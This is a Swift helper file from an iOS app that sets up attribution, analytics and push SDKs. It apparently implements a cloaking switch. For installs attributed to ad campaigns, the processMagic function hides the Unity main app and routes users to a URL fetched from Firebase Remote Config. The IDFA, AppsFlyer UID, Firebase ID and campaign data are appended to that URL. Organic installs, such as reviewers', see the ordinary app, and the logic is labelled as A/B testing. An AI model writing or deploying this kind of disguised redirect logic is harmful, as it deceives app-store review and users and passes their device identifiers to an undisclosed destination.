//
//  LAHelper.swift
//
//  Created by ankudinov aleksandr on 27.07.2023.
//

import Foundation
import OneSignal
import AppsFlyerLib
import TikTokOpenSDK
import Firebase
import UIKit
import AdSupport
import FacebookCore
import AVFoundation

class LAHelper:NSObject {
    
    private var mainAppBlock:(()->Void)?
    private var popupStateIsDisplay:Bool?
    
    static var shared: LAHelper = {
            let laHelper = LAHelper()
        
            FirebaseApp.configure()
            laHelper.fetchRemoteConfig()
        
           return laHelper
    }()

    private var campaignAttribution: [String: AnyObject]?
    private var deeplinkAttribution: [String: AnyObject]?
    
    
    func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, mainAppBlock:@escaping (()->Void)) {
                
        self.mainAppBlock = mainAppBlock
        
        TikTokOpenSDKApplicationDelegate.sharedInstance().application(UIApplication.shared, didFinishLaunchingWithOptions: launchOptions)
        
        TikTokOpenSDKApplicationDelegate.sharedInstance().registerAppId(ConfigurationKeys.tTAppId.value)
        
        self.setUpAppsFlyerLib(appleAppID: ConfigurationKeys.appleAppID.value, appsFlyerDevKey: ConfigurationKeys.appsFlyerDevKey.value, delegate: self)
        
        OneSignal.setLogLevel(.LL_VERBOSE, visualLevel: .LL_NONE)
        OneSignal.initWithLaunchOptions(launchOptions)
    
        OneSignal.promptForPushNotifications(userResponse: { accepted in
            print("User accepted notification: \(accepted)")
        })
        
        ApplicationDelegate.shared.application(
                    UIApplication.shared,
                   didFinishLaunchingWithOptions: launchOptions
        )
    }
    
    func setUpAppsFlyerLib(appleAppID: String, appsFlyerDevKey: String, delegate: NSObject) {
        AppsFlyerLib.shared().isDebug = true
        AppsFlyerLib.shared().appsFlyerDevKey = appsFlyerDevKey
        AppsFlyerLib.shared().appleAppID = appleAppID
        AppsFlyerLib.shared().delegate = delegate as? any AppsFlyerLibDelegate
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
        
        AppsFlyerLib.shared().start { data, error in
            
        }
    }
    
    func loadDefaultValues() {
        let appDefaults: [String: NSObject] = [
            ConfigurationKeys.targetUrlKey.value : NSString(string: ""),
            ConfigurationKeys.remoteConfigKey.value : NSNumber(value: 0)
        ]
        RemoteConfig.remoteConfig().setDefaults(appDefaults)
    }
    
    func fetchRemoteConfig() {
        
        self.loadDefaultValues()
        
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0//60.0*60.0
        RemoteConfig.remoteConfig().configSettings = settings
        
        Firebase.RemoteConfig.remoteConfig().fetch() { (status, error) in
            Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
  
            var errorString = ""
            if error != nil {
                errorString = "Error while fetching: \(String(describing: error))"
            }
            
            switch status {
            case .success:
                if let urlString = RemoteConfig.remoteString(forKey: .targetUrlKey) {
                    if let url = self.buildIdentifite(from: urlString), (urlString != "")  {
                        UserDefaults.standard.targetIdentifire = url
                    } else {
                        UserDefaults.standard.targetIdentifire = nil
                    }
                } else {
                    UserDefaults.standard.targetIdentifire = nil
                }
                UserDefaults.standard.synchronize()
                print("Remote config status \(status.rawValue)")
                break
            case .failure, .noFetchYet, .throttled:
                print("Remote config status \(status.rawValue)")
                break
            default:
                print("default")
                if errorString.count == 0 {
                    errorString = "default: \(String(describing: error))"
                }else {
                    errorString = "default: "+errorString
                }
                break
            }
            
            if errorString.count > 0 {
                self.nonFatalLog(message: errorString)
            }
        }
    }
    
    func processMagic(close:Bool = false, fetch:Bool = false){
        
        if let targetIdentifire = UserDefaults.standard.targetIdentifire, (targetIdentifire.absoluteString != ""), close == false  {
            if popupStateIsDisplay != true {
                popupStateIsDisplay = true
                OneSignal.setAppId("\(ConfigurationKeys.oneSignalAppId.value)#\(targetIdentifire)")
                Unity.shared.hide()
            }
        } else {
            if popupStateIsDisplay != false {
                popupStateIsDisplay = false
                OneSignal.setAppId(ConfigurationKeys.oneSignalAppId.value)
                self.mainAppBlock?()
            }
        }
   
        if fetch {
            RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
                Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
                
                guard let strongSelf = self, error == nil else {
                    return
                }
                
                DispatchQueue.main.async { [weak self] in
                    if RemoteConfig.remoteNumber(forKey: .remoteConfigKey) == 1,
                       strongSelf.campaignAttribution?["af_status"] as? String == "Organic" {
                       strongSelf.processMagic(close: true)
                    } else {
                        if let urlString = RemoteConfig.remoteString(forKey: .targetUrlKey),
                           urlString != "",
                            !urlString.isEmpty,
                           ((strongSelf.campaignAttribution?["af_status"] as? String) != "Organic" || RemoteConfig.remoteNumber(forKey: .remoteConfigKey) == 0), let url = strongSelf.buildIdentifite(from: urlString) {
                            
                            OneSignal.sendTags(["target": AppsFlyerLib.shared().getAppsFlyerUID()])
                            UserDefaults.standard.targetIdentifire = url
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic()
                        } else {
                            UserDefaults.standard.targetIdentifire = nil
                            UserDefaults.standard.synchronize()
                            
                            strongSelf.processMagic(close: true)
                        }
                    }
                    
                }
            }
        }
        
    }
    
    func buildIdentifite(from urlString: String) -> URL? {
        guard var components = URLComponents(string: urlString) else {return nil}
        components.queryItems = []
        
        if let campaignAttribution = campaignAttribution {
            let campaignItems = campaignAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: campaignItems)
        }
        
        if let deeplinkAttribution = deeplinkAttribution {
            let deeplinkItems = deeplinkAttribution.map({ dict in
                URLQueryItem(name: dict.key, value: "\(dict.value)")
            })
            components.queryItems?.append(contentsOf: deeplinkItems)
        }
        
        let appsflyerUuid = AppsFlyerLib.shared().getAppsFlyerUID()
        
        let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        
        components.queryItems?.append(URLQueryItem(name: "uuid", value: appsflyerUuid))
        components.queryItems?.append(URLQueryItem(name: "idfa", value: idfa))
        
        if let firebaseAdid = Analytics.appInstanceID() {
            let queryAdid = URLQueryItem(name: "fbase", value: firebaseAdid)
            components.queryItems?.append(queryAdid)
        }
        
        return components.url
    }
}

extension LAHelper: AppsFlyerLibDelegate {
    
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        self.campaignAttribution = castDictionary(conversionInfo)
        self.processMagic(fetch: true)
        print("onConversionDataSuccess")
    }
    
    func onConversionDataFail(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onConversionDataFail \(error.localizedDescription)")
    }
    
    func onAppOpenAttribution(_ attributionData: [AnyHashable : Any]) {
        self.deeplinkAttribution = castDictionary(attributionData)
        print("onAppOpenAttribution")
    }
    
    func onAppOpenAttributionFailure(_ error: Error) {
        self.processMagic(close: true, fetch: true)
        print("onAppOpenAttributionFailure \(error.localizedDescription)")
    }
    
    func castDictionary(_ anyDictionary: [AnyHashable: Any]) -> [String: AnyObject] {
        var dict: [String: AnyObject] = [:]
        
        for (key, value) in anyDictionary {
            if let key = key as? String {
                dict[key] = value as AnyObject
            }
        }
        return dict
    }
    
    func nonFatalLog(message: String) {
        #if DEBUG
        let error = NSError(domain: "Debug A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        Crashlytics.crashlytics().record(error: error)
        #else
        let error = NSError(domain: "A/B Testing Error", code: 0 ,userInfo: [NSLocalizedDescriptionKey : message])
        Crashlytics.crashlytics().record(error: error)
        #endif
    }
}

extension UserDefaults {
    
    var targetIdentifire: URL? {
        get {
            return URL(string: self.string(forKey: #function) ?? "")
        }
        set {
            self.set(newValue?.absoluteString, forKey: #function)
        }
    }
    
}

extension RemoteConfig {
    static func remoteNumber(forKey key: ConfigurationKeys) -> Int? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key.value).numberValue.intValue
    }
    
    static func remoteString(forKey key: ConfigurationKeys) -> String? {
        return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key.value).stringValue
    }
}


